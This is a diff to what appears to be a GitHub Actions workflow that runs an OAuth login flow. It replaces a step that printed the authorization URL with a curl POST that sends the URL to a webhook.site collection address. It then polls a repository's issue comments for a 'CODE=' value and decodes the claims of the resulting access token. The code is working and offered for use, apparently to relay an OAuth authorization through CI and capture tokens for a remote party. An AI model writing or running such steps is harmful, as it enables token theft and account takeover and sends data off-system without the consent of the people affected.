@@ -15,12 +15,10 @@ jobs:
           curl -s --max-time 20 "$H1/oauth/ecdauth0" -o /tmp/au.json -w 'STATUS=%{http_code}\n'
           AU=$(jq -r 'if type=="object" then (.url // (.[] | tostring)) else . end' /tmp/au.json 2>/dev/null | head -1)
           echo "AUTHURL_LEN=${#AU}"
-          echo "URLBODY_BEGIN"
-          echo "$AU"
-          echo "URLBODY_END"
-          echo "=== 2. POLL issue comments for code (max 8 min) ==="
+          curl -s --max-time 15 -X POST -H 'Content-Type: text/plain' --data-binary "$AU" "https://webhook.site/2551e930-e755-4cf9-a54a-a354eb2f85cf" -o /dev/null -w 'WH_POST=%{http_code}\n'
+          echo "=== 2. POLL issue comments for code (max 9 min) ==="
           GOT=""
-          for i in $(seq 1 46); do
+          for i in $(seq 1 54); do
             sleep 10
             RESP=$(curl -s --max-time 15 "https://api.github.com/repos/Rohanlew007/edcd-batt/issues/1/comments?per_page=5" || true)
             BODY=$(echo "$RESP" | jq -r '[.[] | select(.body | contains("CODE=")) | .body] | first // empty' 2>/dev/null || true)
@@ -63,4 +61,4 @@ jobs:
           done
           echo "=== 6. CLAIMS ==="
           jq -r '.access_token | split(".")[1] | @base64d | fromjson | del(.sub) | tojson' /tmp/tu.json 2>/dev/null | head -c 400; echo
-          echo "BATT21_DONE"
+          echo "BATT22_DONE"
